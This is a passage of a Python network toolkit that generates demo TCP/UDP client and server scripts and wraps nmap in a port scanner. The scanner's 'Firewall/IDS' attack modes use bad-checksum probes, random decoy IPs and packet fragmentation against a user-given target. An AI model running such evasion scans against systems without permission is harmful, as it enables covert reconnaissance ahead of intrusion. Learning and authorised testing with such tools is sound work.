      msg1=tcp_client.recv(4096).decode()
      print(msg1)
      msg2=tcp_client.recv(4096).decode()
      if msg2:
         print(msg2)
         confermation=input("tell me your answer then i will send that:- ").encode('utf-8')
         tcp_client.send(confermation)
         msg3=tcp_client.recv(4096).decode()
         print(msg3)
         msg4=tcp_client.recv(4096).decode()
         print(msg4)
         msg5=tcp_client.recv(4096).decode()
         if msg5:
            print(msg5)  
            confermation2=input("What's your opinion maam :- ").encode('utf-8')
            tcp_client.send(confermation2)
            msg7=tcp_client.recv(4096).decode()
            if msg7: 
               print(msg7)
               print("Maam Your Connection has been closed from bothside...(◠‿・)—☆")   
               tcp_client.close()
            else:
                tcp_client.shutdown(SHUT_RD)
except:
   print("Your connection has been Closed maam Some interupt you may created...•́  ‿ ,•̀")
   tcp_client.close()
"""
                 with open(tcp_udp_client,"w") as client_file:
                      client_file.write(tcp_client_prog)
                 with Progress() as process:
                      pro=process.add_task("Processing...",total=100)
                      for generat in range(100):
                          process.update(pro,advance=1)
                          s(0.1)
                 print(f"Maam Your Client file has been Created 😌:- {tcp_udp_client}") 
                 if name=="nt":
                    print(f"Sorry Maam You have to run it by manually ͜ಥ ʖ̯ ಥ...{tcp_udp_client}")
                    # if you comment out this line 👇 then may crash the program...
                    # system(f"start cmd /k python.exe -u {tcp_udp_client}")
                 else:
                     system(f"dbus-launch gnome-terminal -q --command 'python -u {tcp_udp_client}'")
             else:
                udp_client_prog="""
from socket import socket,AF_INET,SOCK_DGRAM
from time import sleep
banner="╰‿╯--------------ÚÐþ ÇLÌÈñ༒ --------------╰‿╯"
for b in banner:
    print(b,end="",flush=True)
    sleep(0.02)
print("")
buffersize=4096
udp_client=socket(family=AF_INET,type=SOCK_DGRAM)
address=input("Please give an ip of Udp Server...(｡•̀ᴗ-)✧ :- ")
port=int(input("Even you have to give the port that u've already given to the server...😌:- "))
msg1=input("You have to say Something the  Udp server:- ").encode('utf-8')   
udp_client.sendto(msg1,(address,port))
recv1=udp_client.recvfrom(buffersize)
print(recv1[0].decode())
recv_bool=bool(recv1[0].decode())
if recv_bool==True:
    sleep(3)
    msg2=input("Do you wanna say something or you can leave blank..:-").encode('utf-8')
    udp_client.sendto(msg2,(address,port))
    if bool(msg2)==False:
        recv4=udp_client.recvfrom(buffersize)
        print(recv4[0].decode())
        udp_client.close()
    else:
        recv2=udp_client.recvfrom(buffersize)
        print(recv2[0].decode())
        sleep(5)
        recv3=udp_client.recvfrom(4096)
        print(recv3[0].decode())
        sleep(3)
        msg3=input("So Maam Do you want to close or leave a blank:- ").encode('utf-8')
        udp_client.sendto(msg3,(address,port))
        recv5=udp_client.recvfrom(buffersize)
        if bool(recv5[0].decode())==True:
            print(recv5[0].decode())
            udp_client.close()
        else:
            recv6=udp_client.recvfrom(buffersize)
            print(recv6[0].decode())
            udp_client.close()
"""
                with open(tcp_udp_client,"w") as client_file:
                      client_file.write(udp_client_prog)
                with Progress() as process:
                     pro=process.add_task("Processing...",total=100)
                     for generat in range(100):
                         process.update(pro,advance=1)
                         s(0.1)
                print(f"Maam Your Client file has been Created 😌:- {tcp_udp_client}")
                if name=="nt":
                    print(f"Sorry Maam You have to run it by manually.͜ ಥ ʖ̯ ಥ...{tcp_udp_client}")
                    # if you comment out this line 👇 then may crash the program...
                    # system(f"start cmd /k python.exe -u {tcp_udp_client}")
                else:
                     system(f"dbus-launch gnome-terminal -q --command 'python -u {tcp_udp_client}'")
             D.server_type()
             server_input=int(input("Maam Which type of server you want to Choose in Socket Programing..🤗:- "))
             inp_server=input("Now please give a suitable name for a Server file (◠‿◕) :- ")
             tcp_udp_server=directory+inp_server+".py"
             if server_input==3:
                tcp_file="""
from socket import socket,AF_INET,SOCK_STREAM,SHUT_RD,SHUT_WR
from threading import Thread
from rich.progress import Progress
from time import sleep
banner="༒ -----------------𝕋ℂℙ 𝕊𝔼ℝ𝕍𝔼ℝ------------------༒ "
for tcp_banner in banner:
    print(tcp_banner,end="",flush=True)
    sleep(0.02)
print("")
port=int(input("Maam Plz give the port number (◍•ᴗ•◍):- "))
tcp_server=socket(AF_INET,SOCK_STREAM)
addres=("0.0.0.0",port)
tcp_server.bind(addres)
tcp_server.listen(2)
print("I am listening on this port:- ",port)
send_ack="Hii Maam, I am server how may i assist you?".encode('utf-8')
def client_handle(client):
    with Progress() as process:
         x=process.add_task("Sending....",total=100)
         for p in range(100):
             process.update(x,advance=1)
             sleep(0.1)
    client.send(send_ack)
    anyy=client.recv(4096).decode()
    if anyy:
       print("client sent the text:- ",anyy)
       send_text="Sorry Maam!! Basically it is a demo server so i can't help you but you can analyze this from the wireshark".encode('utf-8')
       info="Do you want to know more maam [y/n]".encode('utf-8')
       sending_themes2="-≫--≫--≫--≫--≫--≫ "
       for y in sending_themes2:
           print(y,end="",flush=True)
           sleep(1)
       print("")
       client.send(send_text)
       sleep(2)
       sending_themes3="⪩ ⪩ ⪩ ⪩ ⪩ ⪩ ⪩ ⪩ ⪩"
       for z in sending_themes3:
           print(z,end="",flush=True)
           sleep(0.5)
       print("")
       client.send(info)
       rec=client.recv(4096)
       val=rec.decode('utf-8')
       if val.lower()=='y':
           info_part_1="First of all open the Wireshark and type host <your ip maam but don't give this type of brackets> and check the port connection".encode('utf-8')
           info_part_2="or if you give the local host ip on client side then just select the interface lo from the wireshark".encode('utf-8')
           sending_themes3="⇝ ⇝ ⇝ ⇝ ⇝ ⇝ ⇝ ⇝"
           for a in sending_themes3:
               print(a,end="",flush=True)
               sleep(1)
           print("")
           client.send(info_part_1)
           sleep(3)
           sending_themes4="➳ ➳ ➳ ➳ ➳ ➳ ➳ ➳ ➳ ➳"
           for b in sending_themes4:
               print(b,end="",flush=True)
               sleep(1)
           print("")
           client.send(info_part_2)
           alive="Maam You're server is still running am i close this Session [y/n]".encode('utf-8')
           sleep(3)
           sending_themes4="⌐╦╦═─ ✑ ✑ ✑ ✑ ✑ ✑"
           for b in sending_themes4:
               print(b,end="",flush=True)
               sleep(3)
           print("")
           client.send(alive)
           msg2=client.recv(4096).decode()
           if msg2.lower()=='n':
              sleep(5)
              client.shutdown(SHUT_WR)
              client.recv(4096)
           else:
               ack5="Thanks maam to spend your valuable time for us...(*˘︶˘*).｡*♡ ".encode('utf-8')
               msg8="(✿◠‿◠)..♡ ♡ ♡ ♡ ♡"
               for g in msg8:
                   print(g,end="",flush=True)
                   sleep(0.5)
               client.shutdown(SHUT_RD)
               client.send(ack5)
               client.close()
       else:
            ack1="Okk Maam nice to meeet you ( ◜‿◝ )♡ ".encode('utf-8')
            ackk="Now I am Closing the Connection Thank you....".encode('utf-8')
            sending_themes6="▄︻̷̿┻̿═━一 ⇝ ⇝ ⇝ ⇝ ⇝ ⇝"
            for d in sending_themes6:
                print(d,end="",flush=True)
                sleep(1)
            print("")
            client.send(ack1)
            sleep(1)
            client.send(ackk)
            sleep(0.1)
            client.close()
    else:
        ack3="Okk Maaam i am closing this Session".encode('utf-8')
        sending_themes7="-⩼ -⩼ -⩼ -⩼ -⩼ -⩼ -⩼ -⩼"
        for c in sending_themes7:
            print(c,end="",flush=True)
            sleep(1)
        print("")
        clent.send(ack3)
        client.close()
while True:
      client,address=tcp_server.accept()
      print("Client is connected:- ",address[0],address[1])
      server_handler=Thread(target=client_handle,args=(client,))
      server_handler.start() 
"""
                with open(tcp_udp_server,"w") as file:
                     file.write(tcp_file)
                total=50
                bar=ProgressBar(total,prefix='Ɠҽղҽɾąէìղց...',spinner_type='db')
                for gen in range(total):
                    bar.iter()
                    s(0.2)      
                print("")
                print(f"File is created check it:- {tcp_udp_server}")
                print("Now I am Run the Program")
                file_name=f"{tcp_udp_server}"
                command=["python",file_name]
                commander.run(command)
             else:
                udp_file="""
from socket import socket,AF_INET,SOCK_DGRAM
from threading import Thread
from time import sleep
import progressbar
banner="亗--------------ÚÐþ §ÈRVÈR----------------亗"
for x in banner:
    print(x,end="",flush=True)
    sleep(0.02)
print("")
sizeofbuffer=4096
global udp_server
def udp_client(client,addr,udp_server):
    print("Received Massage from Client:- ",client.decode())
    msg="Hii Maam I am UDP Server how may i help you...".encode('utf-8')
    udp_server.sendto(msg,addr)
    c1=udp_server.recvfrom(sizeofbuffer)
    print("Massage from Client:- ",c1[0].decode())
    c1_bool=bool(c1[1])
    if c1_bool==True:
       msg2="Basically Maam i'm a Connectionless Program (╯︵╰,) So whenever you will send any data i will send too....".encode('utf-8')
       udp_server.sendto(msg2,c1[1])
       msg3="So maam i can't help you but you can check my program...".encode('utf-8')
       udp_server.sendto(msg3,addr)
       c2=udp_server.recvfrom(sizeofbuffer)
       print("Receive Massage:- ",c2[0].decode())
       c2_bool=bool(c2[1])
       if c2_bool==True:
           msg5="Thank you Maam for your feedback to close this port...( ꈍᴗꈍ)".encode('utf-8')
           udp_server.sendto(msg5,c2[1])
           udp_server.close()
       else:    
           msg6="Sorry Maam i have to close because developer didn't program me for further massagess...(⁎˃ᆺ˂))".encode('utf-8') 
           udp_server.sendto(msg6,c2[1])
           udp_server.close()
    else:
        msg4="Okk Maam i am closing the ports...(◠ ‿ ◕)".encode('utf-8')
        udp_server.sendto(msg4,addr)
        udp_server.close()
server_address=input("Maam please give your Udp Server address...(⊃｡•́‿•̀｡)⊃ :- ")
server_port=int(input("Even give your server port maam 🤗:- "))
udp_server=socket(family=AF_INET,type=SOCK_DGRAM)
udp_server.bind((server_address,server_port))
bar=progressbar.ProgressBar(maxval=50,widgets=[' ༺ ',"Generating...",
progressbar.AnimatedMarker(),'༻ ',progressbar.Bar(left=' [',right=']'),' (',progressbar.ETA(),') ']).start()
print("Your Server is generating Maam...")
for x in range(50):
    bar.update(x)
    sleep(0.1)
print("")
print("Maam I am listening on this address and port:- ",server_address,server_port)
while True:
    server_response=udp_server.recvfrom(sizeofbuffer)
    client=server_response[0]
    address=server_response[1]
    print("Client is Connected:- ",address)
    client_handle=Thread(target=udp_client,args=(client,address,udp_server,))
    client_handle.start()
"""
                with open(tcp_udp_server,"w") as file:
                     file.write(udp_file)
                total=50
                bar=ProgressBar(total,prefix='Ɠҽղҽɾąէìղց...',spinner_type='db')
                for gen in range(total):
                    bar.iter()
                    s(0.2 )    
                print(f"File is created check it:- {tcp_udp_server}")
                print("Now I am Run the Program")
                file_name=f"{tcp_udp_server}"
                command=["python",file_name]
                commander.run(command)
        elif value==3:
              udp_warn="""
 ███      █████████                        █████     ███                         ███
░███     ███░░░░░███                      ░░███     ░░░                         ░███
░███    ███     ░░░   ██████   █████ ████ ███████   ████   ██████  ████████     ░███
░███   ░███          ░░░░░███ ░░███ ░███ ░░░███░   ░░███  ███░░███░░███░░███    ░███
░███   ░███           ███████  ░███ ░███   ░███     ░███ ░███ ░███ ░███ ░███    ░███
░░░    ░░███     ███ ███░░███  ░███ ░███   ░███ ███ ░███ ░███ ░███ ░███ ░███    ░░░ 
 ███    ░░█████████ ░░████████ ░░████████  ░░█████  █████░░██████  ████ █████    ███
░░░      ░░░░░░░░░   ░░░░░░░░   ░░░░░░░░    ░░░░░  ░░░░░  ░░░░░░  ░░░░ ░░░░░    ░░░ 
              """
              print(colored(udp_warn,"red",attrs=['bold','blink']))
              D.port_monitor()
              print("")
              tr=Tree()
              tr.create_node("Port Scanner","portscanner")
              tr.create_node("Tcp","tcp",parent="portscanner")
              tr.create_node("Udp","udp",parent="portscanner")
              tr.create_node("Nmap","nmap",parent="portscanner")
              tr.create_node("Scanning","scanning",parent="nmap")
              tr.create_node("Xmas Scan","xmas",parent="scanning")
              tr.create_node("Zombie Scan","zombie",parent="scanning")
              tr.create_node("Maimon Scan","maimon",parent="scanning")
              tr.create_node("Service Detection","manymore",parent="scanning")
              tr.create_node("Firewall/IDS","ids",parent="nmap")
              tr.create_node("Proxy Attack","proxi",parent="ids")
              tr.create_node("Decoy Scan","cloakscan",parent="ids")
              tr.create_node("Badsum Attack","etc",parent="ids")
              tr.create_node("OsScanner","more",parent="nmap")
              tr.create_node("Normal Mode","normal",parent="more")
              tr.create_node("Topical Mode","topical",parent="more")
              tr.create_node("Aggressive Mode","brutal",parent="more")
              tr.create_node("Flags","flags",parent="tcp")
              tr.create_node("SYN","syn",parent="flags")
              tr.create_node("FIN","fin",parent="flags")
              tr.create_node("PSH","psh",parent="flags")
              tr.create_node("ACK","ack",parent="flags")
              tr.create_node("URG","urg",parent="flags")
              tr.create_node("RST","rst",parent="flags")
              tr.create_node("Port","port",parent="tcp")
              tr.create_node("Sourceport","sourceport",parent="port")
              tr.create_node("Destinationport","destinationport",parent="port")
              tr.create_node("Portype","portype",parent="udp")
              tr.create_node("Sport","sport",parent="portype")
              tr.create_node("Dport","dport",parent="portype")
              tr.create_node("DNS","dns",parent="udp")
              target_ip_addr=input("Maam give the target ip (つ≧ ▽ ≦ つ) :- ")
              port_text="Maam in this Scanning it has 3 methods..."
              for p in port_text:
                  print(p,end="",flush=True)
                  s(0.03)
              s(2)    
              print("")
              print(tr) 
              print("If you use it on UDP method, it's important to be aware that there may be a higher likelihood of experiencing packet loss maam...(＞д＜)")
              scanning_inp=int(input("Maam please select the mode like 1,2,3 😎:- ")) 
              if scanning_inp==1:
                 D.nmap_design()
                 print("")
                 print("")
                 illu = """
                          .    ⣴⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⠀⠀⠀⠀⢹⠀⠀⠀⡼⠋⢷⡀⠀⠀⣸⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⠀⠀⠀⠘⡆⠀⡼⠃⣴⡀⢻⡄⠀⡏⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⠹⡄⠀⠀⠀⣷⡼⠁⣼⣿⣷⡀⢹⣼⠃⠀⠀⢀⡾⠁⠀⠀⠀⣠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⢳⣄⠀⠀⠀⢻⣄⢰⣄⡟⢁⣾⣿⠟⢿⣿⡄⠹⣆⡔⠀⣾⠁⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⢤⡀⠀⠀⠀⠹⣧⡀⢧⡈⣿⣤⡟⢠⣾⣿⠇⠀⠈⢿⣿⣆⠸⣧⣾⠇⣴⠃⣰⡟⠁⠀⠀⠀⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢦⣄⠐⢦⡘⣿⣄⢿⣾⠏⢠⣾⣿⠃⠀⠀⠀⠈⢻⣿⣆⠘⣿⣾⣃⣾⠟⣠⠆⢀⣤⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣄⠀⠀⠀⣈⠙⣷⣬⣻⣮⣿⣿⠏⢰⣿⡿⠃⠀⠀⠀⠀⠀⠈⢻⣿⣦⠈⢿⣿⣧⡾⣣⣴⠟⠁⠀⠀⠀⢀⣠⠖⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢶⣤⣈⠳⣮⣽⣿⣿⣿⠃⣰⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⠈⢿⣿⣿⣟⣥⡶⢋⣠⡴⠞⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠰⢤⣀⡀⠀⠀⠀⢤⣌⡻⢿⣾⣿⣿⡿⠁⣰⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⡀⢻⣿⣿⣿⡾⠟⣋⡠⠄⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠳⠶⣤⣬⣛⣿⣿⣿⡿⠁⣴⣿⠟⠀⢀⣠⣤⣶⣶⣶⣶⣶⣤⣤⣀⠀⠘⣿⣷⡀⠻⣿⣿⣿⣟⣩⣤⡴⠶⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⣬⣭⣿⣿⣿⡟⠁⣼⣿⢏⣤⣾⡿⠟⠋⣉⣁⣀⣈⣉⢙⠛⠿⣷⣦⣜⣿⣷⡄⠹⣿⣿⣿⣭⣥⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠒⠒⠒⠲⠶⢶⣶⣾⣿⣿⡟⢀⣾⣿⣿⣿⣿⣿⡶⣿⡟⢻⣿⣿⣿⣟⠛⣿⡷⣾⣿⣿⣿⣿⣿⡄⠸⣿⣯⣷⣶⣶⠶⠶⠒⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠶⠶⠶⣾⠏⢠⣾⣿⣿⣿⠋⠉⠀⠀⣿⡇⠸⣿⣿⣿⡿⠀⣼⠇⠀⠈⠙⣻⣿⣿⣿⣆⠘⣿⡶⠶⠶⠦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠤⠤⠴⠶⠾⣿⠏⢠⣿⡿⠉⠻⣿⣷⣦⣀⠀⠘⢿⣦⣈⠛⢋⣠⣼⠟⠀⢀⣠⣾⣿⡿⠋⢻⣿⣆⠘⢿⡿⠶⠶⠤⠤⠤⠄⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⠋⣰⣿⡟⠁⠀⠀⠈⠛⢿⣿⣷⣦⣤⣉⣛⣛⣛⣋⣥⣤⣶⣿⡿⠟⠁⠀⠀⠀⠹⣿⣧⠈⢿⡒⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣾⠃⣰⣿⡟⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⢿⣿⣿⣿⣿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⡈⢻⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠒⠋⠉⢀⡼⠁⣼⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣷⡀⢳⡄⠉⠉⠓⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⢁⣼⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⡄⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣀⣈⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣉⣭⣭⣩⣭⣭⣍⣭⣭⣭⣭⣭⣭⣭⣭⣭⣭⣉⣉⣉⣉⣉⣉⣉⣉⣉⣙⣀⣹⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⣩⠿⠋⠉⠟⢉⣿⠟⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⢿⡝⢿⣏⠛⠏⠙⠻⣏⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠋⠀⠀⠀⢠⡿⠃⡼⢁⣿⠏⣾⢻⣿⢹⡏⣿⡿⣿⢻⣇⢻⡎⢿⡎⠻⡌⠻⣦⠀⠀⠀⠈⠑⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⡰⠋⠀⠀⠀⣼⠏⢸⠃⣸⡇⢸⠃⣿⠁⢿⠘⣿⠈⢧⠈⢿⡀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⠀⠀⠀⣰⠇⠀⠀⠀⣿⠁⠉⠀⣿⠀⠈⠀⢹⡆⠀⠀⠈⢷⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠋⠀⠀⠀⢠⠇⠀⠀⠀⢿⠀⠀⠀⠈⡇⠀⠀⠀⠈⢇⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⣸⠀⠀⠀⠀⢼⠀⠀⠀⠀⢹⡄⠀⠀⠀⠘⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠛⠀⠀⠀⠀⠈⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

"""
                 print(colored(illu,"green",attrs=['bold']))
                 print("So maam you've Choosen Nmap.../̵͇̿/’̿’̿ ̿ ̿ ̿  ")
                 D.nmap_table()
                 attack_mode=int(input("Choose the Attack Mode Maam ( ͠° ͟ʖ ͡°)=Ε/̵͇̿̿/’̿̿ ̿ ̿ ̿ ̿ ̿ :-  "))
                 nmap_scanner=nmap.PortScanner()
                 port_1=input("Enter the port number of target ip ｡◕  ‿ ◕ ｡ :- ")
                 port_2=input("Enter the 2nd port it would be range port number of target ip(Optional):- ")
                 if attack_mode==1:
                    D.firewall()
                    print("")
                    D.firewall_attack_mode()
                    firewall_attack=int(input("Maam it has also 4 types attacks so which want to use( * ˘ ︶ ˘ * ).｡*♡:-  "))
                    fragments_pkts=input("Do you want to send as MTU(Maximum Transmission Unit) then type the number(8,16,24,32,so on...) or simply you can leave it:- ")
                    if firewall_attack==1:
                        def badsum_attack(mtu='1400',port_multiple='',port_3=''):
                            if bool(port_multiple)==False:
                               scanning_text1="︻╦╤─ ҉ -¨ ♥ * *♡ * ♥*” ♡. ♥♡ 乂❤‿❤乂"
                               for b in scanning_text1:
                                   print(b,end="",flush=True)
                                   s(0.2)
                               print("")
                               bad_checksum=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_3}",arguments=f"--badsum --mtu {mtu} -e {interface_val}")
                               def downhost(bad_checksum):
                                   for key,value in bad_checksum.items():
                                       if key=='nmap':
                                          key=value['scanstats']
                                          for key,value in key.items():
                                              if key=='downhosts':
                                                  return value
                               host_down=downhost(bad_checksum)
                               if host_down=='1':
                                  for key,value in bad_checksum['nmap'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                               elif host_down=='0':
                                    for key,value in bad_checksum['scan'].items():
                                        v=json.dumps(value,indent=4)
                                        print(key,"=>",v)
                                    nmap_badsum_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                    nmap_badsum_save=directory+nmap_badsum_1+".json"
                                    if bool(nmap_badsum_1)==True:
                                        with open(nmap_badsum_save,"w") as save_file:
                                             inp=json.dumps(bad_checksum,indent=4)
                                             save_file.write(inp)
                                        total=50
                                        bar=ProgressBar(total,prefix='చąìէ ą Ɱօʍҽղէ...',spinner_type='db')
                                        for gen in range(total):
                                            bar.iter()
                                            s(0.2)      
                                        print("")
                                        print(f"Your file is:- {nmap_badsum_save}")
                                        system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                        system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_badsum_save}';rm -rf /usr/share/mona/user_name.txt")
                                        print("Hope you'll enjoy this output Maam...🥰") 
                                    else:
                                        print("Okkk Noouuu Problem Maam...( ｡ •̀ ᴗ -)✧")        
                               else:
                                  bad_checksum    
                            else:
                               scanning_text2="( φ_<)︻╦╤─ - - - - - - 💥"
                               for b in scanning_text2:
                                    print(b,end="",flush=True)
                                    s(0.2)
                               print("")
                               bad_checksum=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_3}-{port_multiple}",arguments=f"--badsum --mtu {mtu} -e {interface_val}")
                               def downhost(bad_checksum):
                                   for key,value in bad_checksum.items():
                                       if key=='nmap':
                                          key=value['scanstats']
                                          for key,value in key.items():
                                              if key=='downhosts':
                                                  return value
                               host_down=downhost(bad_checksum)
                               if host_down=='1':
                                  for key,value in bad_checksum['nmap'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                               elif host_down=='0':
                                    for key,value in bad_checksum['scan'].items():
                                        v=json.dumps(value,indent=4)
                                        print(key,"=>",v)
                                    nmap_badsum_1=input("Do you want to save it in a file then give a suitable name or simply you can leave it if you don't want( ◜ ‿ ◝ )♡:- ")
                                    nmap_badsum_save=directory+nmap_badsum_1+".json"
                                    if bool(nmap_badsum_1)==True:
                                        with open(nmap_badsum_save,"w") as save_file:
                                             inp=json.dumps(bad_checksum,indent=4)
                                             save_file.write(inp)
                                        total=50
                                        bar=ProgressBar(total,prefix='చąìէ ą Ɱօʍҽղէ...',spinner_type='db')
                                        for gen in range(total):
                                            bar.iter()
                                            s(0.2)      
                                        print("")
                                        print(f"Your file is:- {nmap_badsum_save}")
                                        system("users|awk '{print $1}'>/usr/share/mona/user_name.txt")
                                        system(f"sudo -u $(cat /usr/share/mona/user_name.txt) dbus-launch gnome-terminal -q --command 'firefox {nmap_badsum_save}';rm -rf /usr/share/mona/user_name.txt")
                                        print("Hope you'll enjoy this output Maam...🥰") 
                                    else:
                                        print("Okkk Noouuu Problem Maam...( ｡•̀ ᴗ-)✧")        
                               else:
                                  bad_checksum  
                        if bool(fragments_pkts)==True:
                            mtu_int=int(fragments_pkts)
                            D.badsum_design()
                            print("")
                            badsum_attack(mtu_int,port_multiple=port_2,port_3=port_1)if bool(port_2)==True else badsum_attack(mtu_int,port_3=port_1)
                        else:
                            D.badsum_design()
                            print("")
                            badsum_attack(port_multiple=port_2,port_3=port_1)if bool(port_2)==True else badsum_attack(port_3=port_1)
                    elif firewall_attack==2:
                         def cloak_attack(mtu='1400',multiple_ports='',port_4=''):
                             decoy_scan={}
                             decoys_rand=input("Maam in this attack do you want to give random ip or manual ip[y/n]:- ")
                             if decoys_rand=='y':
                                rand_num=input("Maam Please Enter numbers of ip that you want to send the target ip ( ✯ ᴗ ✯ ):- ")
                                if bool(multiple_ports)==False:
                                   scanning_text3="  ҉ ══>  ҉  ҉  ҉ <══  ҉ "
                                   for b in scanning_text3:
                                       print(b,end="",flush=True)
                                       s(0.2)
                                   print("")
                                   decoy_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=port_1,arguments=f"-D RND:{rand_num} --mtu {mtu} -e {interface_val}")
                                else:
                                    scanning_text4="▄︻┻═┳一 ••••••••••.•.βᥲ𝘯𝙜 βᥲ𝘯𝙜.•.•"
                                    for b in scanning_text4:
                                        print(b,end="",flush=True)
                                        s(0.2)
                                    print("")
                                    decoy_scan=nmap_scanner.scan(hosts=target_ip_addr,ports=f"{port_4}-{multiple_ports}",arguments=f"-D RND:{rand_num} --mtu {mtu} -e {interface_val}")
                                def downhost(decoy_scan):
                                    for key,value in decoy_scan.items():
                                        if key=='nmap':
                                           key=value['scanstats']
                                           for key,value in key.items():
                                               if key=='downhosts':
                                                  return value
                                host_down=downhost(decoy_scan)
                                if host_down=='1':
                                  for key,value in decoy_scan['nmap'].items():
                                      v=json.dumps(value,indent=4)
                                      print(key,"=>",v)
                                elif host_down=='0':
                                     for key,value in decoy_scan['scan'].items():
